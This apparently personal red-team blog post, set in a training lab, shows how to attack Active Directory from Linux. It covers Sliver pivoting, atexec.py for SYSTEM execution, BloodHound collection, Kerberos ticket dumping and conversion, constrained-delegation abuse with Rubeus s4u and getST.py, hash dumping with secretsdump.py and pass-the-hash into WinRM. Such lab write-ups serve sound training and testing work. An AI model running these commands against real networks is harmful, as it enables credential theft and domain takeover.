<hr>
<p>title: The Art of Exploiting Active Directory from Linux</p>
<h2 id="date-2024-09-07">date: 2024-09-07</h2>
<p>Over the past 6 months, I&#39;ve been focusing more on the operational side of red teaming and have been actively working at pwning various Active Directory environments and labs. During this time, I finished the <a href="https://app.hackthebox.com/prolabs/overview/cybernetics">Cybernetics</a> prolab and passed the <a href="https://www.alteredsecurity.com/adlab">CRTP</a> and <a href="https://www.alteredsecurity.com/redteamlab">CRTE</a> certifications from Altered Security.</p>
<p>After spending considerable time working with different Command &amp; Control (C2) frameworks, troubleshooting .NET compilation errors, forgetting how to UAC bypass, wrapping commands in PS Credential objects, and dealing with PowerShell Constrained Language Mode (CLM), Iâ€™ve come to realize that exploiting AD purely from Windows will cause my life expectancy to decrease significantly.</p>
<p><img src="https://i.gyazo.com/8a5954d25d69bd68b67d933f83545d3f.png" alt="wtf"></p>
<p>So, that really got me thinking: why do we even perform attacks on Active Directory from Windows? </p>
<h2 id="overview">Overview</h2>
<p>Throughout my time working on AD labs and helping out my friends with their labs, I realized something: <strong>Windows is extremely hard to debug</strong>. </p>
<p>It&#39;s hard to Google most errors as they are extremely generic and unique to the particular attack that you&#39;re working on, and the error messages are often misleading. Furthermore, commands that I ran may not work for others; and there are many other things to consider, such as:</p>
<ul>
<li>Do you currently have a ticket associated with your session? (Kerberos Double Hop Problem)<ul>
<li>If not, do you have credentials to wrap your commands in a PS Credential object?</li>
</ul>
</li>
<li>Are you restricted by PowerShell Constrained Language Mode (CLM)?</li>
<li>Oh well, surely <code>klist purge</code> actually purges all tickets, right?</li>
</ul>
<p><img src="https://i.gyazo.com/78bd4c004514fa7acd1614cfc651faec.png" alt="wtf"></p>
<p>In this blog post, I&#39;ll be going through some of the reasons why I believe that attacking Active Directory from Linux is a better choice than attacking from Windows; and of course some examples of how to do so.</p>
<h2 id="so-what-">So, what?</h2>
<p>I had this realization that the majority of the time when my friends were having issues, I would direct them to port their ticket(s) to linux and use the tools there with <code>--debug</code>. The errors thrown here are usually much more helpful and easier to google, and not affected by the instability of Windows.</p>
<blockquote>
<p>&quot;tools&quot; refers to the <a href="https://github.com/fortra/impacket">Impacket</a> suite, which is generally stable and well-maintained.</p>
</blockquote>
<p>I believe that the majority of the time, you can perform the same attacks on Active Directory from Linux as you would from Windows, but with the added benefit of being able to debug your issues more easily.</p>
<h2 id="disclaimer">Disclaimer</h2>
<p>I don&#39;t claim that attacking from Linux is the right choice for all scenarios. It is ultimately the responsibility of the operator to decide what tools to use based on the situation at hand.</p>
<blockquote>
<p>The examples used in this post were performed in the lab environment generously provided by <a href="https://www.alteredsecurity.com/">Altered Security</a> for the <a href="https://www.alteredsecurity.com/redteamlab">CRTE</a>, I have received written permission to use the screenshots in this post on the condition that I do not disclose any secrets from the lab.</p>
</blockquote>
<h2 id="assumed-breach">Assumed Breach</h2>
<p>In many cases, you may already have a foothold in the network. More often than not, this is a single domain user account and/or workstation that you have compromised. The first few things you might want to do are:</p>
<ol>
<li>Identify and Resolve Hosts (especially the Domain Controller)<ul>
<li>specifically populating your <code>/etc/hosts</code> file with the IP addresses of the hosts in the network, we&#39;ll understand why later.</li>
</ul>
</li>
<li>Run Bloodhound Collector(s)</li>
</ol>
<h3 id="identifying-and-resolving-hosts">Identifying and Resolving Hosts</h3>
<p>Given a domain account with local administrative privileges on a workstation, we can very easily identify the Domain Controller by pinging the domain name. </p>
<pre><code class="lang-powershell">ping <span class="hljs-string">[domain_name]</span>
</code></pre>
<p><img src="https://i.gyazo.com/fc0eaf4baf6935d746ec36ffb91518cf.jpg" alt="1"></p>
<p>By doing so, we can easily identify that the domain controller is <code>192.168.1.2</code>; this is in another subnet so we&#39;ll need to pivot through the workstation to reach the Domain Controller.</p>
<h3 id="pivoting-with-sliver">Pivoting with Sliver</h3>
<p>I won&#39;t go into much detail here, but we&#39;ll be using Sliver as our C2 framework and pivoting through the workstation using their inband socks proxy.</p>
<p><img src="https://i.gyazo.com/e01808339f119c16fd59d96ea5bd3e74.png" alt="2"></p>
<p><img src="https://i.gyazo.com/4c9337e70a8288e5c29f5c15d24c5835.png" alt="3"></p>
<p>Upon getting our callback, we are an unprivileged user on the workstation. In order to obtain a SYSTEM beacon, we&#39;ll need to perform a UAC bypass.</p>
<p><img src="https://i.gyazo.com/b0f32aa9db544bdb558c9dc45f4eb3d2.png" alt="4"></p>
<p>But we&#39;re lazy, so we can actually just execute beacon from Linux using <a href="https://tools.thehacker.recipes/impacket/examples/atexec.py"><code>atexec.py</code></a> which runs a command using the task scheduler remotely (which runs at the SYSTEM context).</p>
<pre><code class="lang-bash">atexec.py <span class="hljs-string">[domain_name]</span>/<span class="hljs-string">[username]</span>:<span class="hljs-string">[password]</span>@<span class="hljs-string">[workstation_ip]</span> <span class="hljs-string">[command]</span>
</code></pre>
<p><img src="https://i.gyazo.com/781c1fac5e026f519406b8d295761ba3.png" alt="5"></p>
<p>And now we have a SYSTEM beacon on the workstation.</p>
<p><img src="https://i.gyazo.com/39f0009a5692943ff904d553b5618d6e.png" alt="6"></p>
<p>In order to proxy all our commands through the workstation, we&#39;ll need to set up an inband socks proxy.</p>
<pre><code class="lang-bash">sliver&gt; socks5 <span class="hljs-literal">start</span>
</code></pre>
<blockquote>
<p>Sliver&#39;s inband socks proxy tends to be unstable on some protocols, and listens on the default port of <strong>1081</strong> on the operator&#39;s machine; remember to modify your <code>/etc/proxychains4.conf</code> file to reflect this.</p>
</blockquote>
<h3 id="resolving-the-domain-controller">Resolving the Domain Controller</h3>
<p>Now, we can verify that we can interact with the domain controller through <code>proxychains</code></p>
<pre><code class="lang-bash">proxychains nxc smb <span class="hljs-string">[IP/FQDN]</span> -u <span class="hljs-string">[username]</span> -p <span class="hljs-string">[password]</span>
</code></pre>
<p><img src="https://i.gyazo.com/91fd5366945f3240229fbbce459736d3.png" alt="7"></p>
<h3 id="resolving-other-hosts">Resolving Other Hosts</h3>
<p>There are a couple ways to resolve the other hosts in the network, the smart and methodical way would be to identify a list of workstations and servers in the network; then resolve them with <code>dig</code>.</p>
<p>The lazy way would be to resolve them by <code>nxc smb</code> sweeping the network, I&#39;ll show both methods here.</p>
<h4 id="methodical-way-ew-">Methodical Way (ew)</h4>
<pre><code class="lang-bash"><span class="hljs-string">proxychains </span><span class="hljs-string">nxc </span><span class="hljs-string">ldap </span>[<span class="hljs-string">IP/</span><span class="hljs-string">FQDN]</span> -u [<span class="hljs-string">username]</span> -p [<span class="hljs-string">password]</span> -M <span class="hljs-built_in">get-network</span> -o <span class="hljs-string">ONLY_HOSTS=</span><span class="hljs-string">true</span>
</code></pre>
<p><img src="https://i.gyazo.com/b7629cf5799f33addabd7df0b0d89b11.png" alt="8"></p>
<p>This gives you a list of all the hosts in the network</p>
<p><img src="https://i.gyazo.com/4bdcca0d9e982b83438108e97d7c4b9f.png" alt="9"></p>
<p>Which you can then resolve with this command, but this takes forever so I wouldn&#39;t personally do it this way :)</p>
<pre><code class="lang-bash">cat [list_of_targets] | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> domain; <span class="hljs-keyword">do</span> proxychains dig @<span class="hljs-string">"[DC_IP]"</span> <span class="hljs-string">"<span class="hljs-variable">$domain</span>"</span>; <span class="hljs-keyword">done</span>
</code></pre>
<h4 id="lazy-way-yay-">Lazy Way (yay)</h4>
<pre><code class="lang-bash">proxychains nxc smb <span class="hljs-string">[IP/FQDN]</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span> -u <span class="hljs-string">[username]</span> -p <span class="hljs-string">[password]</span> --log <span class="hljs-string">[log_file]</span>
</code></pre>
<p><img src="https://i.gyazo.com/28ebf328ae6d25b20dd12275cef459ef.png" alt="10"></p>
<p>Then, we can parse the output to extract the IP addresses &amp; hostnames of the hosts in the network.</p>
<pre><code class="lang-bash"><span class="hljs-attribute">awk</span> <span class="hljs-string">'/SMBv1:False)/{flag=1;next}/SMBv1:True)/{flag=0}flag'</span> sweep.log | awk <span class="hljs-string">'{print <span class="hljs-variable">$7</span>, <span class="hljs-variable">$9</span>"."<span class="hljs-variable">$11</span>}'</span> | sed <span class="hljs-string">'s/\\.*//'</span>
</code></pre>
<blockquote>
<p>This one-liner is a bit janky, and sometimes bugs out if the output is not expected; please be ready to fix it</p>
</blockquote>
<p><img src="https://i.gyazo.com/879ff3ead8c3ab79ba790d024ea78f25.png" alt="11"></p>
<p>If you&#39;re looking really closely, you&#39;ll see an anomaly there: <code>192.168.1.56 US-MSSQL.Connection</code>. This is an SQL server, and we can verify this by connecting to it with <code>proxychains nxc mssql [IP/FQDN] -u [username] -p [password]</code>.</p>
<p><img src="https://i.gyazo.com/fff38ed31f6dee4c524497a99b14da4a.png" alt="11"></p>
<h2 id="bloodhound">Bloodhound</h2>
<p>First timers may have a lot of issues when running bloodhound collectors remotely, as it requires a bit of troubleshooting sometimes.</p>
<h3 id="the-curious-case-of-bloodhound-python">The Curious Case of Bloodhound-Python</h3>
<p>This is an example of why running tools from Linux is both a blessing and a curse. Let&#39;s try running our collector without <code>/etc/hosts</code> populated first, and see what happens.</p>
<pre><code class="lang-sh"><span class="hljs-selector-tag">proxychains</span> <span class="hljs-selector-tag">bloodhound-python</span> <span class="hljs-selector-tag">-u</span> <span class="hljs-selector-attr">[username]</span> <span class="hljs-selector-tag">-p</span> <span class="hljs-selector-attr">[password]</span> <span class="hljs-selector-tag">-d</span> <span class="hljs-selector-attr">[domain]</span> <span class="hljs-selector-tag">-ns</span> <span class="hljs-selector-attr">[DC_IP]</span> <span class="hljs-selector-tag">-c</span> <span class="hljs-keyword">all</span>
</code></pre>
<p><img src="https://i.gyazo.com/c4610d7579c651153eac53fa753f8254.png" alt="12"></p>
<blockquote>
<p>At first glance, you may assume this error is due to <code>/etc/hosts</code> not being populated, but this error persists even after populating <code>/etc/hosts</code> with the IP addresses of the hosts in the network.</p>
</blockquote>
<p>Debugging this issue will require us to take a look at the source code, and start printing out some variables to see what&#39;s going on.</p>
<pre><code class="lang-bash">  File <span class="hljs-string">"/home/kali/.local/lib/python3.11/site-packages/dns/resolver.py"</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">1321</span>, <span class="hljs-keyword">in</span> <span class="hljs-built_in">resolve</span>
    timeout = self.<span class="hljs-title">_compute</span>_timeout(<span class="hljs-built_in">start</span>, lifetime, resolution.errors)
</code></pre>
<p>Let&#39;s take a look at the source code, and see what&#39;s going on.</p>
<pre><code class="lang-python">def query(
    self,
    qname: Union[dns.name.Name, str],
    rdtype: Union[dns.rdatatype.RdataType, str] = dns.rdatatype.A,
    rdclas<span class="hljs-variable">s:</span> Union[dns.rdataclass.RdataClass, str] = dns.rdataclass.IN,
    tcp: bool = False,
    <span class="hljs-keyword">source</span>: Optional[str] = None,
    raise_on_no_answer: bool = True,
    source_por<span class="hljs-variable">t:</span> <span class="hljs-keyword">int</span> = <span class="hljs-number">0</span>,
    lifetime: Optional[float] = None,
) -&gt; Answer:  # pragm<span class="hljs-variable">a:</span> <span class="hljs-keyword">no</span> cover
    <span class="hljs-string">""</span><span class="hljs-comment">"Query nameservers to find the answer to the question.</span>

    This method calls <span class="hljs-built_in">resolve</span>() with ``<span class="hljs-built_in">search</span>=True``, <span class="hljs-built_in">and</span> <span class="hljs-keyword">is</span>
    provided <span class="hljs-keyword">for</span> backwards compatibility with prior versions of
    dnspython.  See the documentation <span class="hljs-keyword">for</span> the <span class="hljs-built_in">resolve</span>() method <span class="hljs-keyword">for</span>
    further details.
    <span class="hljs-string">""</span><span class="hljs-comment">"</span>
    warnings.warn(
        <span class="hljs-string">"please use dns.resolver.Resolver.resolve() instead"</span>,
        DeprecationWarning,
        stacklevel=<span class="hljs-number">2</span>,
    )

    <span class="hljs-keyword">print</span>(<span class="hljs-keyword">f</span><span class="hljs-string">"\n[gatari] querying: {qname} {rdtype} {rdclass}"</span>)
    <span class="hljs-keyword">print</span>(<span class="hljs-keyword">f</span><span class="hljs-string">"[gatari] using nameserver(s): {self.nameservers}"</span>)
    <span class="hljs-keyword">print</span>(<span class="hljs-keyword">f</span><span class="hljs-string">"[gatari] using port: {self.port}"</span>)
    <span class="hljs-keyword">print</span>(<span class="hljs-keyword">f</span><span class="hljs-string">"[gatari] using protocol: {'TCP' if tcp else 'UDP'}"</span>)
    <span class="hljs-keyword">print</span>(<span class="hljs-keyword">f</span><span class="hljs-string">"[gatari] timeout: {self.timeout}\n"</span>)

    <span class="hljs-keyword">return</span> self.<span class="hljs-built_in">resolve</span>(
        qname,
        rdtype,
        rdclass,
        tcp,
        <span class="hljs-keyword">source</span>,
        raise_on_no_answer,
        source_port,
        lifetime,
        True,
    )
</code></pre>
<p>After adding some debugging statements, let&#39;s run the collector again.</p>
<pre><code class="lang-sh"><span class="hljs-selector-tag">proxychains</span> <span class="hljs-selector-tag">bloodhound-python</span> <span class="hljs-selector-tag">-u</span> <span class="hljs-selector-attr">[username]</span> <span class="hljs-selector-tag">-p</span> <span class="hljs-selector-attr">[password]</span> <span class="hljs-selector-tag">-d</span> <span class="hljs-selector-attr">[domain]</span> <span class="hljs-selector-tag">-ns</span> <span class="hljs-selector-attr">[DC_IP]</span> <span class="hljs-selector-tag">-c</span> <span class="hljs-keyword">all</span>
</code></pre>
<p><img src="https://i.gyazo.com/06b2e77337cc5f07da43c9a12bcfef69.png" alt="13"></p>
<p>My first thought was that the timeout of <strong>3 seconds</strong> was too short, considering we&#39;re running the collector through a socks proxy; which is notoriously slow. So, I increased the timeout to 10 seconds with <code>--dns-timeout 10</code>.</p>
<pre><code class="lang-sh"><span class="hljs-selector-tag">proxychains</span> <span class="hljs-selector-tag">bloodhound-python</span> <span class="hljs-selector-tag">-u</span> <span class="hljs-selector-attr">[username]</span> <span class="hljs-selector-tag">-p</span> <span class="hljs-selector-attr">[password]</span> <span class="hljs-selector-tag">-d</span> <span class="hljs-selector-attr">[domain]</span> <span class="hljs-selector-tag">-ns</span> <span class="hljs-selector-attr">[DC_IP]</span> <span class="hljs-selector-tag">-c</span> <span class="hljs-keyword">all</span> <span class="hljs-selector-tag">--dns-timeout</span> <span class="hljs-selector-tag">10</span>
</code></pre>
<p><img src="https://i.gyazo.com/0617147394a3f0961a90572c0f478cfb.png" alt="14"></p>
<p>The error seems to persist, the next thing I noticed was that the query used UDP instead of TCP. Although the Socks5 protocol supports both TCP and UDP, sliver&#39;s implementation of some protocols is a bit unstable. Let&#39;s flip it to use TCP with <code>--dns-tcp</code> (and remove <code>--dns-timeout 10</code> so that we only test one variable at a time).</p>
<pre><code class="lang-sh"><span class="hljs-selector-tag">proxychains</span> <span class="hljs-selector-tag">bloodhound-python</span> <span class="hljs-selector-tag">-u</span> <span class="hljs-selector-attr">[username]</span> <span class="hljs-selector-tag">-p</span> <span class="hljs-selector-attr">[password]</span> <span class="hljs-selector-tag">-d</span> <span class="hljs-selector-attr">[domain]</span> <span class="hljs-selector-tag">-ns</span> <span class="hljs-selector-attr">[DC_IP]</span> <span class="hljs-selector-tag">-c</span> <span class="hljs-keyword">all</span> <span class="hljs-selector-tag">--dns-tcp</span>
</code></pre>
<p><img src="https://i.gyazo.com/1432ad79459a8f8289254dd4979a3c36.png" alt="15"></p>
<p>We managed to get past the first query, but we&#39;re still getting an error. Thankfully, I&#39;ve seen this error appear in a PR on the bloodhound-python repository: <a href="https://github.com/dirkjanm/BloodHound.py/pull/196">https://github.com/dirkjanm/BloodHound.py/pull/196</a></p>
<p>TLDR: Prepend the domain name with a <code>.</code></p>
<pre><code class="lang-sh"><span class="hljs-selector-tag">proxychains</span> <span class="hljs-selector-tag">bloodhound-python</span> <span class="hljs-selector-tag">-u</span> <span class="hljs-selector-attr">[username]</span> <span class="hljs-selector-tag">-p</span> <span class="hljs-selector-attr">[password]</span> <span class="hljs-selector-tag">-d</span> <span class="hljs-selector-attr">[domain]</span>. <span class="hljs-selector-tag">-ns</span> <span class="hljs-selector-attr">[DC_IP]</span> <span class="hljs-selector-tag">-c</span> <span class="hljs-keyword">all</span> <span class="hljs-selector-tag">--dns-tcp</span>
</code></pre>
<p>And, now we finally see an issue related to <code>/etc/hosts</code> not being populated.</p>
<p><img src="https://i.gyazo.com/67007cbb3a7b5e95ad983ebaea265d70.png" alt="16"></p>
<p>After populating <code>/etc/hosts</code> with the IP addresses of the hosts in the network, we can finally run the collector successfully.</p>
<pre><code class="lang-sh"><span class="hljs-selector-tag">proxychains</span> <span class="hljs-selector-tag">bloodhound-python</span> <span class="hljs-selector-tag">-u</span> <span class="hljs-selector-attr">[username]</span> <span class="hljs-selector-tag">-p</span> <span class="hljs-selector-attr">[password]</span> <span class="hljs-selector-tag">-d</span> <span class="hljs-selector-attr">[domain]</span>. <span class="hljs-selector-tag">-ns</span> <span class="hljs-selector-attr">[DC_IP]</span> <span class="hljs-selector-tag">-c</span> <span class="hljs-keyword">all</span> <span class="hljs-selector-tag">--dns-tcp</span>
</code></pre>
<p><img src="https://i.gyazo.com/7f331e9f2c9e8c2bcc99ec61f961d9cc.png" alt="17"></p>
<p>When I first used <a href="https://github.com/dirkjanm/BloodHound.py">bloodhund-python</a>, I saw that the repository was:</p>
<ul>
<li>Updated recently (2 months ago)</li>
<li>Almost 2000 stars</li>
</ul>
<p>And automatically assumed that it was stable and well-maintained. However, I quickly realized that the tool was not as stable as I thought it would be, and required a bit of debugging to get it to work.</p>
<p>I want to emphasize that we shouldn&#39;t blame the tool&#39;s maintainers, as they&#39;re doing this work for free in their own time. I am extremely grateful for the work that they have done, and that this post is meant to show the reality (including the bad parts) of using tools from Linux.</p>
<h3 id="alternative-collectors-rusthound">Alternative Collectors: RustHound</h3>
<p>Another collector that I like to use if <code>bloodhound-python</code> is being a pain is <a href="https://github.com/NH-RED-TEAM/RustHound">RustHound</a>. It&#39;s a bit more stable, and is generally faster than other collectors.</p>
<pre><code class="lang-sh">proxychains rusthound -u <span class="hljs-string">[username]</span> -p <span class="hljs-string">[password]</span> -d <span class="hljs-string">[domain]</span>
</code></pre>
<p><img src="https://i.gyazo.com/4259644791bd8bc058ed733c5910a5d6.jpg" alt="18"></p>
<p>And it worked right out of the box, without any issues.</p>
<h2 id="what-if-i-have-no-credentials-">What if I have no credentials?</h2>
<p>I wanted to take a quick detour to discuss your options if you have a foothold in a workstation on an unelevated user account, and you don&#39;t have credentials to this user. You could find yourself in this situation after compromising a web/SQL server and are sitting on a reverse shell.</p>
<p>The first thing you should check is if your current logon session is populated with cached kerberos tickets, you can check this with <code>klist</code>, <code>Rubeus.exe triage</code> or <code>Rubeus.exe klist</code>. I prefer <code>Rubeus.exe triage</code> as service accounts tend to have lots of tickets and it&#39;s an eyesore to look at.</p>
<p><img src="https://i.gyazo.com/244f8fa9a2d746eb67228560ebc04038.png" alt="19"></p>
<p>This is what your output should look like if you&#39;re on an unelevated user account, as you won&#39;t be able to see other logon sessions.</p>
<p>Now, we can dump our own tickets with <code>Rubeus.exe dump</code> and use them remotely.</p>
<p><img src="https://i.gyazo.com/68bbde24ec1a84c46700e4db6f105a06.png" alt="20"></p>
<p>Your output should look something like this (without the white boxes, of course)</p>
<p><img src="https://i.gyazo.com/01fa03dbfd2f7d8f1785765bbfaba4b4.png" alt="21"></p>
<p>Alternatively, you can use <code>Rubeus.exe tgtdeleg</code> to obtain a usable ticket for your current user without needing elevation.</p>
<p><img src="https://i.gyazo.com/19107436e2fb20f7fc95f5e523d6a198.png" alt="22"></p>
<h2 id="windows-linux-interoperability-">Windows &lt;-&gt; Linux (Interoperability)</h2>
<p>Tickets can be easily ported between Windows (<code>.kirbi</code>) and Linux (<code>.ccache</code>), allowing flexibility between operating systems. With reference to the tickets we acquired earlier with <code>tgtdeleg</code>, we can convert them to a format that is usable in Linux.</p>
<p>The general steps are as follows:</p>
<ol>
<li>If the ticket is base64-encoded (from Rubeus), decode it with <code>echo [base64] | base64 -d &gt; ticket.kirbi</code></li>
<li>Convert the ticket to a format that is usable in Linux with <code>ticketConverter.py ticket.kirbi ticket.ccache</code></li>
<li>Export the <code>KRB5CCNAME</code> environment variable to point to the ticket with <code>export KRB5CCNAME=/path/to/ticket.ccache</code></li>
<li>Run your (impacket) tools with <code>-k -no-pass</code> to indicate that you want to use the cache for authentication.</li>
</ol>
<p><img src="https://i.gyazo.com/4c9cd783447f67460be18a81c3cf67f3.png" alt="23"></p>
<p>Next, we can use it with <code>netexec</code> by exporting the ticket and running it with <code>--use-kcache</code> (note that this flag changes between tools)</p>
<pre><code class="lang-sh"><span class="hljs-keyword">export</span> KRB5CCNAME=... &amp;&amp; nxc smb ... --use-kcache
</code></pre>
<p><img src="https://i.gyazo.com/7b2f344517d8ed8f6feefaff407e569d.png" alt="24"></p>
<p>The green plus sign indicates that we have successfully authenticated with the ticket.</p>
<h2 id="performing-attacks">Performing Attacks</h2>
<p>Now that we know how to port our tickets from Windows to Linux, we can start performing attacks remotely on the network.</p>
<blockquote>
<p>There will be little to no explanation of the specifics of the attacks performed, understanding the attack is an exercise left to the reader. Additionally, I recommend taking the <a href="https://www.alteredsecurity.com/adlab">CRTP</a> &amp; <a href="https://www.alteredsecurity.com/redteamlab">CRTE</a> courses from Altered Security.</p>
</blockquote>
<p>In this post, we&#39;ll only be covering one attack: abusing <strong>constrained delegation</strong> on a controlled principal.</p>
<h3 id="constrained-delegation">Constrained Delegation</h3>
<p>After reviewing our BloodHound collected data, we see this node</p>
<p><img src="https://i.gyazo.com/dad464e6636c3ea32d575e792750e814.png" alt="25"></p>
<p>Which indicates that <code>appsvc@us.techcorp.local</code> has the <code>msds-AllowedToDelegateTo</code> attribute set to <code>US-MSSQL.us.techcorp.local</code>, this means that <code>appsvc</code> is allowed to act on behalf of a domain user to a service on <code>US-MSSQL</code>. </p>
<p>We can see the SPN that we can delegate to on the BloodHound node properties</p>
<p><img src="https://i.gyazo.com/e723accc4db57250a5a0187fbbdaba25.png" alt="26"></p>
<p>Or, we can enumerate it with <code>findDelegation.py</code> on Linux:</p>
<pre><code class="lang-sh">proxychains findDelegation.py <span class="hljs-string">[domain]</span>/<span class="hljs-string">[username]</span>:<span class="hljs-string">[password]</span>
</code></pre>
<p><img src="https://i.gyazo.com/e2e27ae966a46d2d5189eba9ec02cde3.png" alt="27"></p>
<p>We can see that <code>appsvc</code> is allowed to delegate to <code>CIFS/US-MSSQL.us.techcorp.local</code>, this is an extremely permissive delegation. </p>
<blockquote>
<p>See: <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket#available-services">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket#available-services</a></p>
</blockquote>
<p>For the sake of demonstration, let&#39;s assume that we have compromised the <code>appsvc</code> account and have their NTLM hash.</p>
<h4 id="windows-linux">Windows -&gt; Linux</h4>
<p>We&#39;ll perform the attack from Windows first, since it&#39;ll likely be more familiar to most readers.</p>
<pre><code class="lang-sh"><span class="hljs-keyword">execute</span>-<span class="hljs-keyword">assembly</span> Rubeus.exe s4u /msdsspn:[delegated_spn] /<span class="hljs-keyword">domain</span>:[<span class="hljs-keyword">domain</span>] /<span class="hljs-keyword">user</span>:[<span class="hljs-keyword">user</span>] /rc4:[ntlm <span class="hljs-keyword">hash</span>] /impersonateuser:[user_with_local_admin] /ptt
</code></pre>
<blockquote>
<p>Remember to check if your <code>/impersonateuser</code> has local admin privileges on the target machine, and is not protected from delegation. See: <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/how-to-configure-protected-accounts">Protected Accounts</a> and <a href="https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group">Protected Users (Group)</a></p>
</blockquote>
<p><img src="https://i.gyazo.com/62e89678fd3f3c826cc3527d99ca35bb.png" alt="28"></p>
<p>And the attack worked flawlessly, now let&#39;s see how we can pass this ticket to be used on Linux (i.e. <code>secretsdump.py</code> to dump hashes remotely).</p>
<p>Firstly, we&#39;ll need the ticket to be in a format that is easily copy-pastable to Linux; we can do this with the <code>/nowrap</code> flag and of course remove the <code>/ptt</code> flag.</p>
<pre><code class="lang-sh"><span class="hljs-keyword">execute</span>-<span class="hljs-keyword">assembly</span> Rubeus.exe s4u /msdsspn:[delegated_spn] /<span class="hljs-keyword">domain</span>:[<span class="hljs-keyword">domain</span>] /<span class="hljs-keyword">user</span>:[<span class="hljs-keyword">user</span>] /rc4:[ntlm <span class="hljs-keyword">hash</span>] /impersonateuser:[user_with_local_admin] /nowrap
</code></pre>
<p><img src="https://i.gyazo.com/9bf98ef3a940f1dd4709f495f8945a35.png" alt="29"></p>
<p>Similarly to before, we can do the same trick to convert the ticket to a format that is usable in Linux.</p>
<pre><code class="lang-sh"><span class="hljs-built_in">echo</span> <span class="hljs-string">"[b64_ticket]"</span> | base64 <span class="hljs-_">-d</span> &gt; ticket.kirbi &amp;&amp; ticketConverter.py ticket.kirbi ticket.ccache &amp;&amp; <span class="hljs-built_in">export</span> KRB5CCNAME=ticket.ccache
</code></pre>
<p><img src="https://i.gyazo.com/17d48ecaeaae86d2b5617f5f26a21a78.png" alt="30"></p>
<p>And, of course we can verify that the ticket is usable with <code>nxc</code></p>
<pre><code class="lang-sh">nxc smb <span class="hljs-string">[IP/FQDN]</span> --use-kcache
</code></pre>
<p><img src="https://i.gyazo.com/015982f7305b7f468e86444f27aa8194.png" alt="31"></p>
<p>We can also use <code>describeTicket.py</code> to visualize the contents of our ticket, and you&#39;ll see that we have a ticket that is usable for the <code>CIFS</code> service on <code>US-MSSQL</code>. However, this means that we won&#39;t be able to use WinRM.</p>
<pre><code class="lang-sh"><span class="hljs-selector-tag">describeTicket</span><span class="hljs-selector-class">.py</span> <span class="hljs-selector-tag">ticket</span><span class="hljs-selector-class">.ccache</span>
</code></pre>
<p><img src="https://i.gyazo.com/21447cf5d00e245e6ebb7beacda4fb18.jpg" alt="32"></p>
<p>We can use the <code>altservice</code> flag to request a ticket for the <code>HTTP</code> service which is usable for WinRM.</p>
<pre><code class="lang-sh"><span class="hljs-keyword">execute</span>-<span class="hljs-keyword">assembly</span> Rubeus.exe s4u /msdsspn:[delegated_spn] /<span class="hljs-keyword">domain</span>:[<span class="hljs-keyword">domain</span>] /<span class="hljs-keyword">user</span>:[<span class="hljs-keyword">user</span>] /rc4:[ntlm <span class="hljs-keyword">hash</span>] /impersonateuser:[user_with_local_admin] /altservice:<span class="hljs-keyword">HTTP</span> /nowrap
</code></pre>
<p>And, now the ticket is usable for the <code>HTTP</code> service on <code>US-MSSQL</code>, which includes WinRM.</p>
<p><img src="https://i.gyazo.com/b4e8657cde2f695f6d3850ce30ed8b37.jpg" alt="33"></p>
<p>Alternatively, you can also use your <code>cifs</code> ticket to dump hashes on the target machine with <code>secretsdump.py</code>; and use the local administrator&#39;s hash to log on via WinRM.</p>
<pre><code class="lang-sh"><span class="hljs-selector-tag">proxychains</span> <span class="hljs-selector-tag">secretsdump</span><span class="hljs-selector-class">.py</span> <span class="hljs-selector-tag">-k</span> <span class="hljs-selector-tag">-no-pass</span> <span class="hljs-selector-attr">[TARGET_FQDN]</span>
</code></pre>
<p><img src="https://i.gyazo.com/032952af57ea8025e1cf391ac4744ca6.png" alt="34"></p>
<p>Now, we can PTH this hash into WinRM with <code>evil-winrm</code> or <code>nxc winrm</code>.</p>
<pre><code class="lang-sh">proxychains nxc winrm <span class="hljs-string">[IP/FQDN]</span> -u <span class="hljs-string">[username]</span> -H <span class="hljs-string">[hash]</span> --local-auth
proxychains evil-winrm -i <span class="hljs-string">[IP/FQDN]</span> -u <span class="hljs-string">[username]</span> -H <span class="hljs-string">[hash]</span>
</code></pre>
<p><img src="https://i.gyazo.com/1b933204bd4bb01314c830ad52e6f4bf.png" alt="35"></p>
<h4 id="linux-windows">Linux -&gt; Windows</h4>
<p>Similarly, we can perform this same attack but on the Linux side; then we&#39;ll transfer the ticket to Windows to verify that it works.</p>
<pre><code class="lang-sh"><span class="hljs-selector-tag">getST</span><span class="hljs-selector-class">.py</span> <span class="hljs-selector-tag">-spn</span> <span class="hljs-selector-attr">[delegated_spn]</span> <span class="hljs-selector-tag">-impersonate</span> <span class="hljs-selector-attr">[user_with_local_admin]</span> <span class="hljs-selector-attr">[controlled_principal]</span> <span class="hljs-selector-tag">-hashes</span> :<span class="hljs-selector-attr">[rc4]</span>
</code></pre>
<p><img src="https://i.gyazo.com/bcaa0f961ac903058c82c927d12e1220.png" alt="36"></p>
<p>We can verify that our ticket works with <code>nxc</code></p>
<pre><code class="lang-sh">nxc smb <span class="hljs-string">[IP/FQDN]</span> --use-kcache
</code></pre>
<p><img src="https://i.gyazo.com/01a9585cbbf87167c1f2d38b42864316.png" alt="37"></p>
<p>There are <strong>2</strong> options for transferring this ticket over to Windows:</p>
<ol>
<li>Transforming the <code>.ccache</code> to <code>.kirbi</code>, and referencing it in <code>Rubeus.exe ptt /ticket:[ticket.kirbi]</code><ul>
<li>Requires you to drop the ticket to disk, may be difficult if you don&#39;t have a C2</li>
</ul>
</li>
<li>Transforming the <code>.ccache</code> to <code>.kirbi</code>, then Base64 encoding it and referencing it in <code>Rubeus.exe ptt /ticket:[base64_ticket]</code><ul>
<li>If you&#39;re using a C2, the length of the ticket may cause argument length issues depending on your C2 protocol</li>
</ul>
</li>
</ol>
<p>I&#39;ll be demonstrating the second method here, as it&#39;s a bit more messy and readers may not be familiar with it.</p>
<pre><code class="lang-sh">ticketConverter<span class="hljs-selector-class">.py</span> ticket<span class="hljs-selector-class">.ccache</span> ticket.kirbi
</code></pre>
<p><img src="https://i.gyazo.com/6caa0ed0bae36d0ac7ef788d34d515c6.png" alt="38"></p>
<pre><code class="lang-sh">cat ticket.kirbi <span class="hljs-string">| base64 -w 0</span>
</code></pre>
<p><img src="https://i.gyazo.com/db52db455c96c22273fe9a2a7882c899.png" alt="39"></p>
